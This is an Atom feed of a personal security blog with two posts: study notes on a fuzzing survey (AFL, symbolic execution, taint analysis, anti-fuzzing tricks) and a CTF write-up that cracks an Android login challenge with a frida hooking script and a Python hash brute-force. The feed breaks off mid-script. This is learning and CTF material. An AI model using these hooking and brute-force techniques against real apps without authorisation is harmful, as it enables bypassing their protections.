<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Slient2009</title>
  
  <subtitle>All I need is Twin Island Milk</subtitle>
  <link href="http://slient2009.github.io/atom.xml" rel="self"/>
  
  <link href="http://slient2009.github.io/"/>
  <updated>2022-01-09T06:51:49.000Z</updated>
  <id>http://slient2009.github.io/</id>
  
  <author>
    <name>slient2009</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Fuzz入门</title>
    <link href="http://slient2009.github.io/2021/12/10/Fuzz-Basic/"/>
    <id>http://slient2009.github.io/2021/12/10/Fuzz-Basic/</id>
    <published>2021-12-10T05:00:00.000Z</published>
    <updated>2022-01-09T06:51:49.000Z</updated>
    
    <content type="html"><![CDATA[<p>先以一篇综述学习Fuzz的基本流程<br>《模糊测试技术综述》 任泽众 《计算机研究与发展》<br>本文总结了Fuzz工作流程，并将其作为行文脉络，详细介绍了各个阶段中的相关技术。<br>重点介绍了AFL及其改进研究，简要介绍了Fuzz的多种应用场景，以及反Fuzz和Fuzz+ML等新的研究方向。</p><span id="more"></span><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20211209143254411.png" alt="image-20211209143254411"></p><h1 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h1><blockquote><p>搜集目标相关信息（输入格式、内部结构），并制订模糊测试的策略，为监控目标在测试中的运行状态做必要的准备。<br>通常依赖于插桩、符号执行以及五点分析这类程序分析技术。</p><p>挑战：使用什么样的程序分析技术，对目标内部达到什么程度的了解。</p></blockquote><h2 id="分析技术与信息获取"><a href="#分析技术与信息获取" class="headerlink" title="分析技术与信息获取"></a>分析技术与信息获取</h2><h3 id="插桩"><a href="#插桩" class="headerlink" title="插桩"></a>插桩</h3><p>向目标代码中的合适位置添加预设好的代码，获取程序的静态或动态执行信息，如程序的抽象语法树、覆盖率和函数内变量取值。</p><h4 id="静态插桩"><a href="#静态插桩" class="headerlink" title="静态插桩"></a>静态插桩</h4><p>在源码或者中间代码的编译过程中进行插桩</p><p>通过GCC在汇编语言上插桩，通过LLVM在生成的中间语言上插桩。</p><p>节省时间、速度快，依赖源代码</p><h4 id="动态插桩"><a href="#动态插桩" class="headerlink" title="动态插桩"></a>动态插桩</h4><p>利用QEMU等模拟技术进行插桩，获取程序的运行时信息。</p><p>资源开销大。</p><h3 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h3><p>将程序行为的推理归结为逻辑领域的推理，通过构建一个表示程序执行的逻辑公式，可以同时推断一个程序在不同输入上的行为。该方法可以是模糊测试获得较好的覆盖率，并且可以深入到程序深处探测漏洞。</p><h4 id="静态符号执行"><a href="#静态符号执行" class="headerlink" title="静态符号执行"></a>静态符号执行</h4><p>通常会因为循环和递归的存在陷入到路径爆炸中，还会因为hash之类操作的存在导致约束求解失败。</p><h4 id="动态符号执行"><a href="#动态符号执行" class="headerlink" title="动态符号执行"></a>动态符号执行</h4><p>针对路径爆炸和非线性约束求解失败的问题，更多使用的是动态符号执行。</p><p>动态符号执行通过对程序进行<strong>实际执行</strong>和<strong>符号化执行</strong>，维护程序的<strong>实际状态</strong>和<strong>符号化状态</strong>，通过<strong>将难以求解的约束替换为实际值</strong>，缓解静态符号执行的问题，并按照深度优先的搜索策略对目标程序进行了探索。</p><p><strong>问题</strong>：<br>由于程序分支的存在，路径爆炸的问题仍然存在。程序越复杂，路径爆炸问题越严重。一种解决办法是使用启发式搜索优先探索重要的路径。<br>使用实际值替换方法解决了部分静态符号执行无法解决的约束求解问题，但是可能会丢失部分路径，造成探索结果不完整。<br>所有的符号执行技术都受限于约束求解方法的能力，比如如何处理取余操作这类的非线性约束，仍然是符号执行面临的挑战。</p><h3 id="污点分析"><a href="#污点分析" class="headerlink" title="污点分析"></a>污点分析</h3><p>五点分析技术会观测程序中哪些数据受到预置污染源（如输入）的污染，目的是跟踪污染源和汇聚点（如敏感数据）之间信息流。</p><p>将污点分析应用到模糊测试中，并降低其资源消耗是最近的重要研究方向。</p><h4 id="静态污点分析"><a href="#静态污点分析" class="headerlink" title="静态污点分析"></a>静态污点分析</h4><p>获取程序控制流图、抽象语法树等信息，依据数据流以及依赖关系精选污点分析。<br>静态污点分析也会有路径爆炸的问题，而简化后的污点分析可能有过度污染的问题。</p><h4 id="动态污点分析"><a href="#动态污点分析" class="headerlink" title="动态污点分析"></a>动态污点分析</h4><p>在程序实际执行的过程中，利用程序的动态执行信息进行污点分析。<br>动态污点资源代价大，分析可信度更高，但是检测结果是否全面取决于污点分析对程序的覆盖情况。</p><h3 id="其他程序分析技术"><a href="#其他程序分析技术" class="headerlink" title="其他程序分析技术"></a>其他程序分析技术</h3><p>面向不同场景的模糊测试研究</p><p>IoT、内核、Android、USB、蓝牙协议、算法复杂度……</p><h2 id="模糊测试在预处理阶段的类型划分"><a href="#模糊测试在预处理阶段的类型划分" class="headerlink" title="模糊测试在预处理阶段的类型划分"></a>模糊测试在预处理阶段的类型划分</h2><h3 id="黑盒模糊测试"><a href="#黑盒模糊测试" class="headerlink" title="黑盒模糊测试"></a>黑盒模糊测试</h3><p>又称输入输出驱动的测试、数据驱动的测试，不能对目标内部状态以及结构进行分析、只能获得输入数据等与内部无关的信息。<br>无法跟踪目标内部的执行状态，只能通过检测目标的输出数据，对目标的状态进行判断。<br>适用于输入数据高度结构化的目标，以及复杂且难以分析的目标，在网络、文件、内核以及IoT模糊测试上都是重要应用。</p><p><strong>意义</strong>：不是所有目标都是开源的；黑盒测试工具设计简单，开发和检测速度快。</p><p><strong>问题</strong>：由于没有目标内部信息，会生成大量无效输入，导致测试的覆盖率相对偏低，检测生成漏洞的能力有限。</p><h3 id="白盒模糊测试"><a href="#白盒模糊测试" class="headerlink" title="白盒模糊测试"></a>白盒模糊测试</h3><p>可以获得充足的目标内部信息，通常采用符号执行的方法。<br>可以生成高质量输入数据，在覆盖率以及程序的深层漏洞检测上有更好的表现。<br>但是在实践中，仍然有路径爆炸的问题，同时伴有大量资源消耗，影响效率。</p><p>在不影响模糊测试效率的前提下，如何获取详细的目标内部信息，是一个重要的研究方向。<br><strong>Driller</strong>: 使用AFL检索程序浅层漏洞，当AFL随机生成的输入无法深入探测程序时，转而进行符号执行。<br><strong>QSYM</strong>： 使用动态二进制转换，将符号执行与本地执行紧密集成，实现了更为细粒度的指令集符号执行，解决了路径约束缓慢、甚至无法形成正确的约束的问题。<br><strong>DigFuzz</strong>: 如何快速而准确地判断哪些程序的路径应该是符号执行技术，是一个混合模糊测试器的优化问题。DigFuzz量化了处理每条路径的困难程度，将难以通过随机种子到达的路径转而交给符号执行，较好地优化了在模糊测试中使用符号执行的策略。</p><h3 id="灰盒模糊测试"><a href="#灰盒模糊测试" class="headerlink" title="灰盒模糊测试"></a>灰盒模糊测试</h3><p>灰盒模糊测试是白盒模糊测试的变体，只能获得部分程序内部信息。</p><p><strong>思想</strong>：对程序内部进行细致而全面的分析，并不是获取良好测试结果的必要条件，仅依靠有限的与测试目标相关的信息，在配合良好的测试策略，仍然可以获得令人满意的测试结果。</p><p>灰盒模糊测试中，最重要的研究成果是AFL。<br>AFL通过在编译时插桩，搜集模糊测试中边缘覆盖率信息；使用进化算法将边覆盖率作为算法的适应函数，使得测试沿着边覆盖率增大的方向进行，极大改善了模糊测试效果。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>黑盒测试：轻量级测试工具，设计简单，测试速度快，但是检测效果不理想，难以进行深层探测。适用于难以进行内部探测的目标，以及开发和测试时间有限的场景。<br>白盒测试：重量级测试工具，更加智能，效果更好，能较好探测深层漏洞，但是开发和测试工作都跟为复杂且耗时。适用于可以分析内部结构的目标，以及对深层漏洞有较高检测要求的任务。<br>灰盒测试：没有明确的定位。从数据的角度，其“灰度”取决于利用的内部信息的多少；从设计的角度，体现了灰盒测试在检测能力与检测代价之间的平衡，达到最佳的检测效果。</p><h2 id="AFL及其改进"><a href="#AFL及其改进" class="headerlink" title="AFL及其改进"></a>AFL及其改进</h2><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20211209205542644.png" alt="image-20211209205542644" style="zoom:67%;" /><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20211209205622938.png" alt="image-20211209205622938" style="zoom:67%;" /><h1 id="实际测试环节"><a href="#实际测试环节" class="headerlink" title="实际测试环节"></a>实际测试环节</h1><h2 id="输入构造"><a href="#输入构造" class="headerlink" title="输入构造"></a>输入构造</h2><blockquote><p>首先获取一定数量的种子，随后确定种子的能量分配策略、种子的优先级以及种子的突变策略，最后根据这些信息获取大量的输入数据。</p></blockquote><p><strong>挑战</strong>：在尽量满足语法语义检查的情况下，短时间生成大量的输入，用以对目标做全面而深入的分析。<br>目前普遍的方法是：得到一个数据集S(Seed),然后根据S按照一定的策略进行一定册数的便宜，获得大量新数据I(Input)，最后将I输入到被测试对象中进行测试。</p><p>为了获得足量的高质量输入数据，需要经过种子获取、种子筛选、种子突变三个阶段。</p><h3 id="种子获取"><a href="#种子获取" class="headerlink" title="种子获取"></a>种子获取</h3><p>直接使用准备好的高质量数据集、通过模型生成、按照策略从执行过的数据中选取。</p><p><strong>挑战与研究方向</strong>：<br>无目标语言的语法时，如何生成有效数据；<br>面向特定的场景和目标，要有针对性的生成方法；（FANS for Android）<br>直接生成模糊测试模型；<br>按照策略从执行过的输入数据中选取作为种子；（AFL的进化算法及其改进）</p><h3 id="种子筛选"><a href="#种子筛选" class="headerlink" title="种子筛选"></a>种子筛选</h3><h4 id="种子的能量分配"><a href="#种子的能量分配" class="headerlink" title="种子的能量分配"></a>种子的能量分配</h4><p>对种子池中的备选种子划分权重，以确定每个种子要用来生成多少输入，也即一个种子的能量。</p><p>在AFL中，没有考虑到程序不同执行路径频率上的差异，造成种子能量分配不合理。<br>具体来说，模糊测试进行一段时间后，部分难以到达的路径只有少数种子能够到达而执行频率过低，这些种子显然需要更多的能量。AFL在这方面的缺陷，导致低频路径上的漏洞需要更多的时间才会被模糊测试出来。</p><p>改进方法：<br>引入马尔科夫链，使得更倾向于访问低频区域。（AFLFast）<br>引入多臂老虎机模型，使用基于平均损耗的自适应能量分配策略，有效降低能量损耗，在有限时间内实现了覆盖率最大化。（EcoFuzz）<br>使用基于模拟退火的能量调度方法，逐渐将能量分配到距离目标更近的种子上，实现对目标程序给定位置的模糊测试。在探测给定目标程序上取得了更好的效果，但是可能遗漏潜在的漏洞。（AFLGo）<br>为克服这个问题，Hawkeye使用静态分析技术，全面收集与目标程序位置相关的调用图、函数以及基本块层面的距离信息；再使用与AFLGo相同的基本块路径距离和覆盖函数相似度这两个指标，指定能量分配策略。对应覆盖函数相似度越大、基本块路径越小的种子将会被分配到更大的能量，产生更多的测试数据。（Hawkeye）</p><p>AFLFast的能量分配策略不能提高模糊测试能力极限，而是缩短到达极限的时间。<br>AFLGo和Hawkeye的能量分配策略是为了引导模糊测试的方向，而不能提高覆盖率。</p><h4 id="种子的优先级"><a href="#种子的优先级" class="headerlink" title="种子的优先级"></a>种子的优先级</h4><p>种子的优先级决定了模糊测试从种子池中选择种子的顺序。</p><p>AFL引入进化算法，使用适应度函数对输入进行评估，选取最佳输入放入种子池。种子池实质上是一个队列，种子按照入队顺序进行测试，一段时候后，队列内种子不再变化。（AFL）<br>AFLFast不在严格遵循FIFO队列策略，而是适当提升较少被执行、能量较低的种子的优先级，尽量平衡不同路径上的模糊测试密度。(AFLFast)<br>对于定向灰盒测试，Hawkeye会根据种子是否出发新的执行路径、种子与目标种子的相似度、种子是否包含目标函数，将种子分配到3个等级的队列中。(Hawkeye)</p><p>值得注意的是，种子的长度是影响种子优先级的重要因素：<br>输入数据越短、内存占用越小、测试速度越快。因此，在覆盖率增加相同的情况下，短输入的优先级更高。<br>在维持覆盖率不变的情况下，AFL反复删除种子的不同部分，试图缩短种子的长度。</p><p>更多的种子筛选策略：Rebert et al., Optimizing seed selection for fuzzing. [USENIX]</p><h3 id="种子突变"><a href="#种子突变" class="headerlink" title="种子突变"></a>种子突变</h3><p>获得了大量种子和对应的能量分配策略以及优先级策略之后，接下来需要在突变策略的指引下快速生成大量输入数据。<br>变异策略直接影响生成数据的质量，保守策略呆滞覆盖率偏低，激进策略导致大量无效输入。</p><h4 id="基本突变方式"><a href="#基本突变方式" class="headerlink" title="基本突变方式"></a>基本突变方式</h4><p><strong>比特翻转</strong>：按照一定的步长，连续反转几个比特位；在随即或特定的位置，反转固定宽度的比特位。<br><strong>简单算数运算</strong>：按照8b的步长，依次按照8b、16b、32b的宽度，从头开始加减操作。（AFL）<br><strong>覆盖</strong>：使用预设的值，将种子中的一些部分进行覆盖。<br><strong>插入</strong>：使用预设的值，插入到种子种的一些位置。<br><strong>删除</strong>：删除种子的某些部分。<br><strong>拼接</strong>：选择2个差异较大的种子进行拼接。</p><h4 id="黑盒突变"><a href="#黑盒突变" class="headerlink" title="黑盒突变"></a>黑盒突变</h4><p>不依赖目标相关信息，按照随机突变策略对种子进行突变。<br>可以快速大量生成输入。（AFL）</p><h4 id="导向型突变"><a href="#导向型突变" class="headerlink" title="导向型突变"></a>导向型突变</h4><p><strong>程序状态导向型突变</strong>：<br>通过程序分析技术，得到种子与程序状态的关系，以此指定突变策略，针对感兴趣的程序状态生成相应的测试数据。（VUzzer，Angora）</p><p><strong>如何确定突变位置</strong>：通常使用污点分析技术，寻找输入与程序状态之间的关系，进而确定突变位置。（Angora,VUzzer,REDQUEEN）<br><strong>输入格式高度结构化的目标</strong>：需要保证种子的结构，防止突变对关键字段的修改。Skyfire只选择种子的特定位置进行突变；ProFuzzer分析模糊测试中对发现漏洞至关重要的输入字段，进而调整策略重点突变这些字段。<br><strong>覆盖、替换、插入时预置字段的有效性</strong>：LangFuzz分析目标语法和足量有效输入样例。</p><p><strong>性能导向型突变</strong>：<br>根据输入数据同模糊测试评估指标的关系制订突变的策略。</p><p>AFL在进行连续字节翻转时，会衡量每个字节对覆盖率提升的程度。如果没有提升，则认为该字节对覆盖率提升无意义。据此，获得一个effectmap，用于保存种子中所有字节的有效性（0或1），以此确定是否进行突变。</p><h2 id="输入选择"><a href="#输入选择" class="headerlink" title="输入选择"></a>输入选择</h2><blockquote><p>尝试通过提前过滤掉无效的输入数据，以节省模糊测试的时间。<br>（似乎这个环节适合使用机器学习技术来完成模式识别任务）</p><p>以FuzzGuard为例，Zong Peiyuan et al., FuzzGuard filtering out unreachable inputs in directed grey-box fuzzing through deep learning. [USENIX]</p></blockquote><p>FuzzGuard使用机器学习技术，预测新产生的输入能否使得程序执行到有漏洞的代码处，删除预测为不可达的输入。论文中还讨论了机器学习应用到Fuzz中需要面对的一些问题：数据集不平衡、突变后种子执行路径的随机性。</p><h2 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h2><blockquote><p>设计合适的实验，依照评估指标对模糊测试进行评估。<br>合适的评估指标，可以反映出模糊测试的真实的执行结果，话可以反应模糊测试方法的实际性能。<br>一个合适的模糊测试实验需要选择合适的模糊测试方法作为对比、合适的对象作为模糊测试的目标、合适的重复测试次数和超时时间。</p><p>目前主要聚焦于<strong>覆盖率</strong>和<strong>暴露漏洞平均时间</strong>。</p></blockquote><h3 id="覆盖率"><a href="#覆盖率" class="headerlink" title="覆盖率"></a>覆盖率</h3><p>在测试过程中，对象被覆盖到的数目占总数的比例。<br>通常而言，高覆盖率更可能发现更多的隐藏漏洞，因此众多研究聚焦于覆盖率的提升。</p><p>AFL使用上下文无关的边覆盖率作为评估指标；<br>Angora使用上下文敏感的分支覆盖率作为评估指标；<br>VUzzer使用块覆盖率作为评估指标；</p><p><strong>问题</strong>：<br>如何完成对复杂程序的覆盖信息统计；（CollAFL）<br>一味提升覆盖率，可能导致在一些无漏洞的正常边块上浪费过多时间，更容易受到反模糊测试的影响；（TortoiseFuzz）<br>如何降低覆盖率统计工作的巨大开销；（UnTracer）</p><h3 id="暴露漏洞平均时间"><a href="#暴露漏洞平均时间" class="headerlink" title="暴露漏洞平均时间"></a>暴露漏洞平均时间</h3><p>(AFLGo)<br>覆盖率这一指标是基于“覆盖率更高可能触发更多漏洞”的假设。<br>如果需要复现某个漏洞，且考虑到漏洞在代码中分布不均匀，单纯的覆盖率指标会导致测试在无关部分浪费资源。</p><h3 id="验证实验设计"><a href="#验证实验设计" class="headerlink" title="验证实验设计"></a>验证实验设计</h3><p>(Klees的4个标准)<br>[1]进行多次实验，并进行统计与检验，获取结果的分布；<br>[2]应该使用如CGC/LAVA等具有确定错误的测试集，或使用具有已知漏洞的程序作为被测试对象；<br>[3]应该尝试各种种子输入，如空种子；<br>[4]超时时间至少为24h，或者尝试不同的超时时间；</p><h1 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h1><p>模糊测试获得的结果无法被直接使用，需要对测试结果进行重现、复现、分析以及威胁性评估等工作，最终确定是否发现了有价值的漏洞。</p><h1 id="模糊测试的挑战与机遇"><a href="#模糊测试的挑战与机遇" class="headerlink" title="模糊测试的挑战与机遇"></a>模糊测试的挑战与机遇</h1><h2 id="反模糊测试"><a href="#反模糊测试" class="headerlink" title="反模糊测试"></a>反模糊测试</h2><p>目前主流的模糊测试技术基于4个前提条件，反模糊测试也可以从这些条件入手：<br>[1]单次执行速度要足够快 ~ 低频路径插入延时代码<br>[2]模糊工具可以获得覆盖率的反馈 ~ 用无意义代码填充覆盖率图<br>[3]目标中的路径约束可以被符号求解 ~ 使用hash运算干扰混合执行，隐式数据传递<br>[4]崩溃可以被模糊工具检测到</p><p>相关文章：<a href="https://securitygossip.com/blog/2019/11/08/fuzzification-anti-fuzzing-techniques/">https://securitygossip.com/blog/2019/11/08/fuzzification-anti-fuzzing-techniques/</a></p><h2 id="模糊工具集成"><a href="#模糊工具集成" class="headerlink" title="模糊工具集成"></a>模糊工具集成</h2><p>整合不同模糊测试工具，构造一个通用模糊测试平台。</p><h2 id="与机器学习结合"><a href="#与机器学习结合" class="headerlink" title="与机器学习结合"></a>与机器学习结合</h2><p>有效输入的模式识别</p><p><strong>问题</strong>：数据源、数据集不平衡、性能问题。</p><h2 id="其他发展方向"><a href="#其他发展方向" class="headerlink" title="其他发展方向"></a>其他发展方向</h2><p>提高自动化程度</p><p>与虚拟机技术结合</p><p>测试效果的评估方案改进</p><h1 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h1><p>看了上述笔记，似乎对Fuzz有了大致的了解，但是细细一想，又好像没学到什么东西。<br>要不然先来回答以下问题：</p><p>插桩、符号执行、污点分析的具体实现原理是什么？有哪些优化工作？<br>clone下来AFL++的代码，再拿到一个样本，怎么上手跑一次Fuzz流程？<br>对于一些术语：覆盖率、路径、基本块、逻辑符号、约束条件等等，准确的定义是什么？</p><p>针对以上问题，我的计划：<br>继续看相关文献，对诸如符号执行、污点分析等技术，对着论文写笔记，学习理论知识。<br>打开<a href="https://github.com/antonio-morales/Fuzzing101">入门实践课</a>，开始动手实践。<br>打开Google，搜索相关术语的定义，或者去相关论文里面找。</p><h3 id="基本块、路径和覆盖率"><a href="#基本块、路径和覆盖率" class="headerlink" title="基本块、路径和覆盖率"></a>基本块、路径和覆盖率</h3><p>待添加</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;先以一篇综述学习Fuzz的基本流程&lt;br&gt;《模糊测试技术综述》 任泽众 《计算机研究与发展》&lt;br&gt;本文总结了Fuzz工作流程，并将其作为行文脉络，详细介绍了各个阶段中的相关技术。&lt;br&gt;重点介绍了AFL及其改进研究，简要介绍了Fuzz的多种应用场景，以及反Fuzz和Fuzz+ML等新的研究方向。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Fuzz" scheme="http://slient2009.github.io/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>几个Android逆向</title>
    <link href="http://slient2009.github.io/2021/12/01/Android-Reverse-1/"/>
    <id>http://slient2009.github.io/2021/12/01/Android-Reverse-1/</id>
    <published>2021-12-01T05:00:00.000Z</published>
    <updated>2022-01-08T09:28:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>记录最近做的一些Android逆向题目。</p><span id="more"></span><h1 id="Accelerate-Time"><a href="#Accelerate-Time" class="headerlink" title="Accelerate-Time"></a>Accelerate-Time</h1><blockquote><p><a href="https://github.com/slient2009/PicGo/blob/main/files/HUAWEI-CTF-%E9%A2%98%E7%9B%AE%E9%99%84%E4%BB%B6.zip">华为内部CTF</a></p></blockquote><p>进去提示只能在固定的时间才能登录，于是先hook this.hour=4。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210820113557084.png" alt="image-20210820113557084"></p><p>跟着走发现需要验证username和password。<br>逻辑比较长且复杂，跟着Password View的监听函数一步步跟找到校验username和password的逻辑。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210820143926398.png" alt="image-20210820143926398"></p><p>关注password的监听事件，在这里可以逆向得到username=Android和password=Greatly。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210820114137957.png" alt="image-20210820114137957"></p><p>username和password得到验证之后，关注login按钮的监听事件，但是最终还是进入到上述的校验逻辑中。<br>接着貌似验证过程就结束了。虽然在onCreate()之后就能发现另外一段校验函数，但是这个函数是如何调用的呢？</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210820144400989.png" alt="image-20210820144400989"></p><p>关注一开始设置的observer，根据LoginActivity.onCreate.2的构造函数，观察的对象就是传进去的当前的LoginActivity。<br>进一步的，如果当前的LoginActivity发生了变化，会调用到updateUiWithUser()进行二次验证。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210820144857352.png" alt="image-20210820144857352"></p><p>在login按钮的点击事件中，会进入下面的函数。<br>Result oLoggedInUser是用户名和密码校验的返回结果，这里检查是否返回了success，如果是，则把this._LoginResult（MutableLiveData类）设置success的子类。这样的修改会被观察者模式发觉，因此调用回调函数onChanged并进一步调用showLoginFailed()或者updateUiWithUser()。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210820145309550.png" alt="image-20210820145309550"></p><p>仔细观察updateUiWithUser()函数，先构造字符串<code>hour+minute+second</code>计算hash值timeMD5，然后构造字符串<code>flag&#123;+timeMD5+&#125;+username+password</code>。<br>但是需要注意的是，username和password是直接使用的其对应的EditText对象，所以拼接的不是<code>Android+Greatly</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">updateUiWithUser</span><span class="params">(LoggedInUserView arg3)</span> </span>&#123;</span><br><span class="line">        Intrinsics.checkExpressionValueIsNotNull(<span class="keyword">this</span>.getString(<span class="number">0x7F0D0041</span>), <span class="string">&quot;getString(R.string.welcome)&quot;</span>);  <span class="comment">// string:welcome &quot;Welcome !&quot;</span></span><br><span class="line">        arg3.getDisplayName();</span><br><span class="line">        <span class="keyword">if</span>(Intrinsics.areEqual(LoginActivityKt.encodeMD5(<span class="string">&quot;flag&#123;&quot;</span> + LoginActivityKt.encodeMD5(String.valueOf(<span class="keyword">this</span>.hour) + String.valueOf(<span class="keyword">this</span>.minute) + String.valueOf(<span class="keyword">this</span>.second)) + <span class="string">&quot;&#125;&quot;</span> + ((EditText)<span class="keyword">this</span>._$_findCachedViewById(id.username)) + ((EditText)<span class="keyword">this</span>._$_findCachedViewById(id.password))), <span class="keyword">this</span>.getString(<span class="number">0x7F0D002E</span>))) &#123;  <span class="comment">// string:code &quot;1a9852e856816224&quot;</span></span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>.getApplicationContext(), <span class="string">&quot;Congulations, You got the secert code&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>.getApplicationContext(), <span class="string">&quot;Yeah, you are logged in but the code is still hidden under the mist&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>虽然非常奇怪，但是不管是smali代码还是hook LoginActivitykt.encodeMD5()的输入参数，都证明确实直接拼接了EditText对象。</p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210820150709400.png" alt="image-20210820150709400" style="zoom: 80%;" /><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210820150729060.png" alt="image-20210820150729060" style="zoom: 50%;" /><p>解密的思路非常简单，直接爆破时间，计算24*60*60次。<br>如果按照<code>flag&#123;MD5(hour+minute+second)&#125;AndroidGreatly</code>来计算，可以得到时间为4:35:23，且hash值满足要求。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">aim = <span class="string">&quot;1a9852e856816224&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">61</span>):</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">61</span>):</span><br><span class="line">            timebytes = (<span class="built_in">str</span>(h) + <span class="built_in">str</span>(m) +<span class="built_in">str</span>(s)).encode()</span><br><span class="line">            timehash = hashlib.md5(timebytes).hexdigest()</span><br><span class="line">            thehash  = hashlib.md5( (<span class="string">&quot;flag&#123;&quot;</span> + timehash[<span class="number">8</span>:<span class="number">24</span>] + <span class="string">&quot;&#125;AndroidGreatly&quot;</span>).encode() ).hexdigest()</span><br><span class="line">            <span class="keyword">if</span>(thehash[<span class="number">8</span>:<span class="number">24</span>] == aim):</span><br><span class="line">                <span class="built_in">print</span>(h,m,s)</span><br><span class="line">                <span class="built_in">print</span>(timehash)</span><br><span class="line">                <span class="built_in">print</span>(thehash)</span><br></pre></td></tr></table></figure><p>如果严格按照代码来，则找不出满足要求的时间。<br>frida爆破代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//覆盖updateUiWithUser()，改为爆破函数，主动调用LoginActiivtyKt.encodeMD5()。</span></span><br><span class="line"><span class="comment">//hook Intrinsics.areEqual(),拦截hash=&quot;1a9852e856816224&quot;的情况</span></span><br><span class="line"><span class="comment">//hook LoginAcitivityKt.encodeMD5()，拦截某次hash值为&quot;1a9852e856816224&quot;的情况，同时打印明文字符串，验证确实直接拼接了EditText对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;long live frida&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> LoginActivityClass = Java.use(<span class="string">&quot;com.flag.reverse.c.ui.login.LoginActivity&quot;</span>);</span><br><span class="line">        LoginActivityClass.$init.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="comment">//hook构造函数，预置时间为4:35:23也过不了</span></span><br><span class="line">            <span class="built_in">this</span>.$init();</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;into LoginActivity() args=&quot;</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">this</span>.hour.value, <span class="built_in">this</span>.minute.value, <span class="built_in">this</span>.second.value);</span><br><span class="line"><span class="built_in">this</span>.hour.value = <span class="number">4</span>;</span><br><span class="line"><span class="built_in">this</span>.minute.value = <span class="number">35</span>;</span><br><span class="line"><span 